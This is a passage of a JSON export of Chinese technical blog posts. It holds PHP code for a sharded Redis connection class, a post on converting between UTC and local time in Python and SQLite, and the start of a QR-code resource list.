#515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">id<\/span> = $<span style=\"color: #ffcc66;\">max<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">else<\/span> <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">id<\/span> &gt; $<span style=\"color: #ffcc66;\">max<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">id<\/span> %= $<span style=\"color: #ffcc66;\">max<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> ($<span style=\"color: #ffcc66;\">id<\/span> - <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>)*<span style=\"color: #cccccc; background-color: #2d2d2d;\">count(<\/span>$<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shards<\/span>) + ($<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'index'<\/span>] +<span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #6699cc;\">false<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#36830;&#25509;&#24182;&#36820;&#22238;key&#23545;&#24212;&#30340;redis&#23545;&#35937;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">public<\/span> <span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">redis<\/span>($<span style=\"color: #ffcc66;\">key<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">TODO: crc32&#22312;32&#20301;&#31995;&#32479;&#19979;&#20250;&#36820;&#22238;&#36127;&#25968;&#65292;&#22240;&#25105;&#20204;&#26159;&#37096;&#32626;&#22312;64&#20301;&#31995;&#32479;&#19978;&#65292;&#26242;&#26102;&#24573;&#30053;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">assert(<\/span><span style=\"color: #f2777a; font-weight: bold;\">PHP_INT_SIZE<\/span> === <span style=\"color: #cccccc; background-color: #2d2d2d;\">8<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">index<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">crc32(<\/span>$<span style=\"color: #ffcc66;\">key<\/span>) % <span style=\"color: #cccccc; background-color: #2d2d2d;\">count(<\/span>$<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shards<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">shard<\/span> = $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shards<\/span>[$<span style=\"color: #ffcc66;\">index<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#23581;&#35797;&#37325;&#29992;&#24050;&#26377;&#36830;&#25509;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>] == $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>] <span style=\"color: #99cc99;\">and<\/span> $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>] == $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>]){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>] != $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>]){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(! $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'redis'<\/span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">select<\/span>($<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>])){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">trigger_error(<\/span><span style=\"color: #66cccc;\">'redis error: select '<\/span> . $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>] . <span style=\"color: #66cccc;\">':'<\/span> .<span style=\"text-decoration: underline;\"> $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">shard<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">] . <\/span><span style=\"color: #66cccc; text-decoration: underline;\">':'<\/span><span style=\"text-decoration: underline;\"> .$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">shard<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">2<\/span><span style=\"text-decoration: underline;\">], <\/span><span style=\"color: #6699cc; text-decoration: underline;\">E_USER_ERROR<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #6699cc;\">false<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>] = $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'redis'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'redis'<\/span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">close<\/span>();\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">unset(<\/span>$<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#26032;&#24314;&#36830;&#25509;.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'redis'<\/span>] = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">Redis<\/span>();\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(! $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'redis'<\/span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">connect<\/span>($<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>], $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>])){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">trigger_error(<\/span><span style=\"color: #66cccc;\">'redis error: connect '<\/span> . $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>] . <span style=\"color: #66cccc;\">':'<\/span> . $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>],<span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">E_USER_ERROR<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #6699cc;\">false<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">db<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">intval(<\/span>$<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span>]);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">db<\/span> != <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span> <span style=\"color: #99cc99;\">and<\/span> !$<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'redis'<\/span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">select<\/span>($<span style=\"color: #ffcc66;\">db<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">trigger_error(<\/span><span style=\"color: #66cccc;\">'redis error: select '<\/span> . $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>] . <span style=\"color: #66cccc;\">':'<\/span> . $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>] .<span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #66cccc; text-decoration: underline;\">':'<\/span><span style=\"text-decoration: underline;\"> .$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">shard<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">2<\/span><span style=\"text-decoration: underline;\">], <\/span><span style=\"color: #6699cc; text-decoration: underline;\">E_USER_ERROR<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'redis'<\/span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">close<\/span>();\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #6699cc;\">false<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">ENABLE_DEVELOP<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">trigger_error(<\/span><span style=\"color: #66cccc;\">'redis connect success. '<\/span> . $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>] . <span style=\"color: #66cccc;\">':'<\/span> . $<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span><span style=\"text-decoration: underline;\">] . <\/span><span style=\"color: #66cccc; text-decoration: underline;\">':'<\/span><span style=\"text-decoration: underline;\"> . $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">shard<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">2<\/span><span style=\"text-decoration: underline;\">], <\/span><span style=\"color: #6699cc; text-decoration: underline;\">E_USER_NOTICE<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }<span style=\"color: #f2777a; background-color: #515151;\">        <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span> = $<span style=\"color: #ffcc66;\">shard<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #6699cc;\">this<\/span>-&gt;<span style=\"color: #ffcc66;\">shard<\/span>[<span style=\"color: #66cccc;\">'redis'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n"
},
{
  "title": "python\u4e2d\u7684UTC\u4e0e\u672c\u5730\u65f6\u533a\u5904\u7406",
  "timestamp": "2013-03-20 17:29:00",
  "tags": [
    "python"
  ],
  "body": "<p>\n\u5728\u901a\u8fc7sqlalchemy\u4f7f\u7528sqlite3\u6570\u636e\u5e93\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u65e5\u671f\u65f6\u95f4\u5b57\u6bb5\u9ed8\u8ba4\u503c\u4e3aCURRENT_TIMESTAMP\uff0c\u4f46\u662f\u67e5\u51fa\u7684\u503c\u5c11\u4e868\u4e2a\u5c0f\u65f6\u3002\u5f88\u660e\u663e\u662f\u9047\u5230\u65f6\u533a\u95ee\u9898\u4e86\u3002\n<\/p>\n\n<p>\nmysql\u7684TIMESTAMP\u5b57\u6bb5\u7c7b\u578b\u548csqlite3\u4e00\u6837\u4f7f\u7528UTC\u65f6\u95f4\u4fdd\u5b58\uff0c\u56e0\u4e3a\u5728\u5b58\u53d6\u65f6\u81ea\u52a8\u8fdb\u884c\u4e86\u672c\u5730\u65f6\u95f4\u4e0eUTC\u65f6\u95f4\u4e92\u8f6c\uff0c\u6240\u4ee5\u4e0d\u4f1a\u9047\u5230\u65f6\u533a\u95ee\u9898\u3002\u4f46\u662fsqlite3\u6ca1\u6709\u81ea\u52a8\u8fdb\u884c\u8fd9\u4e00\u8f6c\u6362\uff0c\u9700\u8981\u5728sql\u4e2d\u81ea\u884c\u8f6c\u6362:\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sql\"><span style=\"color: #99cc99;\">select<\/span> datetime(<span style=\"color: #cc99cc;\">CURRENT_TIMESTAMP<\/span>, <span style=\"color: #66cccc;\">'localtime'<\/span>)\n<\/pre>\n<\/div>\n\n<p>\n\u8fdb\u4e00\u6b65google\u540e\uff0c\u627e\u5230\u4e86\u8fd9\u7bc7\u6587\u7ae0\uff1a\u300a<a href=\"http:\/\/lucumr.pocoo.org\/2011\/7\/15\/eppur-si-muove\/\">Dealing with Timezones in Python<\/a>\u300b\uff0c\u6587\u7ae0\u5927\u610f\u662fpython\u4e2d\u7684datetime\u5e93\u9ed8\u8ba4\u4e0d\u643a\u5e26\u65f6\u533a\u4fe1\u606f\uff0c\u800c\u52a0\u4e0a\u65f6\u533a\u540e\u53c8\u4e0e\u4e0d\u5e26\u65f6\u533a\u7684datetime\u5bf9\u8c61\u65e0\u6cd5\u4e00\u8d77\u5de5\u4f5c\uff08\u5982\uff1a\u6bd4\u8f83\uff09\uff0c\u53e6\u5916\u50cfdatetime.datetime.utcnow()\u8fd4\u56de\u7684utc\u65f6\u95f4\u548cdatetime.datetime.now()\u8fd4\u56de\u7684\u672c\u5730\u65f6\u95f4\u4e5f\u662f\u4e0d\u643a\u5e26\u65f6\u533a\u4fe1\u606f\u7684\uff08tzinfo\u5c5e\u6027\u4e3aNone\uff09\uff0c\u5bb9\u6613\u5f15\u8d77\u6df7\u6dc6\uff0c\u56e0\u6b64\u5904\u7406\u7684\u7b80\u5355\u6027\uff0c\u5185\u90e8\u6700\u597d\u7edf\u4e00\u4f7f\u7528UTC\u6807\u51c6\u65f6\u95f4\uff0c\u548c\u7528\u6237\u4ea4\u4e92\u65f6\u518d\u8f6c\u6362\u4e3a\u672c\u5730\u65f6\u95f4\u3002\n<\/p>\n\n<p>\n\u4e0b\u9762\u662f\u4e92\u8f6c\u7684\u7b97\u6cd5\uff1a\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">\/usr\/bin\/env python<\/span>\n\n<span style=\"color: #99cc99;\">import<\/span> datetime\n<span style=\"color: #99cc99;\">import<\/span> time\n<span style=\"color: #99cc99;\">import<\/span> sys\n\n<span style=\"color: #99cc99;\">if<\/span> sys.version &gt;= <span style=\"color: #66cccc;\">'3.2.'<\/span>:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">localtimezone<\/span> = datetime.timezone(datetime.timedelta(seconds=-time.timezone)<span style=\"text-decoration: underline;\">, time.tzname[0])<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">utctimezone<\/span> = datetime.timezone.utc\n<span style=\"color: #99cc99;\">else<\/span>:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">from<\/span> dateutil <span style=\"color: #99cc99;\">import<\/span> tz\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">localtimezone<\/span> = tz.tzlocal()\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">utctimezone<\/span> = tz.gettz(<span style=\"color: #66cccc;\">'UTC'<\/span>)\n\n<span style=\"color: #99cc99;\">def<\/span> <span style=\"color: #f99157;\">parsedatetime<\/span>(dt, fmt=<span style=\"color: #66cccc;\">\"%Y-%m-%d %H:%M:%S\"<\/span>):\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"\"\"parse local datetime string as utc datetime object\"\"\"<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> datetime.datetime.strptime(dt, fmt).replace(tzinfo=localtimezone).ast<span style=\"text-decoration: underline;\">imezone(utctimezone)<\/span>\n\n<span style=\"color: #99cc99;\">def<\/span> <span style=\"color: #f99157;\">formatdatetime<\/span>(dt, fmt=<span style=\"color: #66cccc;\">\"%Y-%m-%d %H:%M:%S\"<\/span>):\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"\"\"format utc datetime object as local datetime string\"\"\"<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> dt.replace(tzinfo=utctimezone).astimezone(localtimezone).strftime(fmt<span style=\"text-decoration: underline;\">)<\/span>\n\n<span style=\"color: #99cc99;\">if<\/span> <span style=\"color: #cc99cc;\">__name__<\/span> == <span style=\"color: #66cccc;\">'__main__'<\/span>:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">input_local_datetime<\/span> = <span style=\"color: #66cccc;\">'2012-01-02 03:04:05'<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">parsed_utc_datetime<\/span> = parsedatetime(input_local_datetime)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">assert<\/span>(formatdatetime(parsed_utc_datetime) == input_local_datetime)\n<\/pre>\n<\/div>\n"
},
{
  "title": "\u4e8c\u7ef4\u7801\u7814\u7a76",
  "timestamp": "2013-03-30 11:21:00",
  "tags": [
    "qrcode"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u4ecb\u7ecd<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<dl class=\"org-dl\">\n<dt> <a href=\"http:\/\/www.itsc.org.sg\/pdf\/synthesis08\/Three_QR_Code.pdf\">Three_QR_Code.pdf<\/a> <\/dt><dd>     RFC\u5f0f\u7684\u6587\u6863\n<\/dd>\n\n<dt> <a href=\"http:\/\/suflow.iteye.com\/blog\/1100678\">\u4e8c\u7ef4\u7801 \u7f16\u7801\u539f\u7406\u7b80\u4ecb<\/a> <\/dt><dd>     \u901a\u4fd7\u6613\u61c2\u7684\u7f16\u7801\u7ec6\u8282\u4ecb\u7ecd\n<\/dd>\n\n<dt> <a href=\"http:\/\/zh.wikipedia.org\/wiki\/QR%E7%A2%BC\">QR\u78bc - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66<\/a> <\/dt><dd>\n<\/dd>\n\n<dt> <a href=\"http:\/\/www.qrstuff.com\/blog\/2011\/11\/23\/qr-code-minimum-size\">QR Code Minimum Size<\/a> \u4e0e <a href=\"http:\/\/www.qrstuff.com\/blog\/2011\/01\/18\/what-size-should-a-qr-code-be\">What Size Should A Printed QR Code Be?<\/a> <\/dt><dd>     \u5173\u4e8e\u53ef\u8bc6\u522b\u6027\u7684\u4e00\u4e9b\u7ed3\u8bba\uff0c\u8be5\u7f51\u7ad9\u4e0a\u6709\u5927\u91cf\u4e8c\u7ef4\u7801\u7814\u7a76\u76f8\u5173\u7684\u6587\u7ae0\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u4e8c\u7ef4\u7801\u5f00\u53d1\u5e93<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<dl class=\"org-dl\">\n<dt> <a href=\"https:\/\/github.com\/fukuchi\/libqrencode\">libqrencode<\/a> <\/dt><dd>     \u57fa\u7840\u7684c\u8bed\u8a00\u4e8c\u7ef4\u7801\u7f16\u7801\u5e93\uff0c\u5f88\u591a\u8bed\u8a00\u57fa\u4e8e\u5b83\u5f00\u53d1\u6269\u5c55\uff0c\u4e0d\u5305\u542b\u751f\u6210png\u56fe\u7684\u529f\u80fd\uff0c\u5982\u9700\u751f\u6210png\u53ef\u53c2\u8003<a href=\"https:\/\/github.com\/bitly\/simplehttp\/blob\/master\/qrencode\/qrencode.c\">\u8fd9\u91cc<\/a>\n<\/dd>\n<dt> <a href=\"https:\/\/github.com\/jeromeetienne\/jquery-qrcode\">jquery-qrcode<\/a> <\/dt><dd>     \u4f7f\u7528javascript\u76f4\u63a5\u5728\u5ba2\u6237\u7aef\u751f\u6210\u4e8c\u7ef4\u7801\uff0c\u4e2d\u6587\u652f\u6301\u53c2\u89c1<a href=\"http:\/\/suflow.iteye.com\/blog\/1687396\">JS\u751f\u6210\u4e8c\u7ef4\u7801\uff0c\u652f\u6301\u4e2d\u6587\u5b57\u7b26<\/a>\n<\/dd>\n<dt> <a href=\"http:\/\/people.freebsd.org\/~vanilla\/qrencode-0.3.tar.bz2\">php's qrencode extension<\/a> <\/dt><dd>     \u4f7f\u7528nginx\u7684\u6269\u5c55\u6027\u80fd\u4f1a\u66f4\u597d\u4e00\u70b9\uff0c\u53c2\u8003\u540e\u9762<a href=\"#sec-4\">nginx\u7684\u76f8\u5173\u6269\u5c55<\/a>.\n<\/dd>\n<dt> <a href=\"http:\/\/trac.koka-in.org\/libdecodeqr\">libdecodeqr<\/a> <\/dt><dd>     \u4e8c\u7ef4\u7801\u89e3\u7801\u5e93\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u4e8c\u7ef4\u7801\u751f\u6210\u5de5\u5177<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<dl class=\"org-dl\">\n<dt> <a href=\"https:\/\/launchpad.net\/qr-code-creator\/\">qr-code-creator<\/a> <\/dt><dd>     linux\u4e0b\u7684GUI\u7a0b\u5e8f\u3002\n<\/dd>\n\n<dt> <a href=\"https:\/\/npmjs.org\/package\/qrcode-terminal\">qrcode-terminal<\/a> <\/dt><dd>     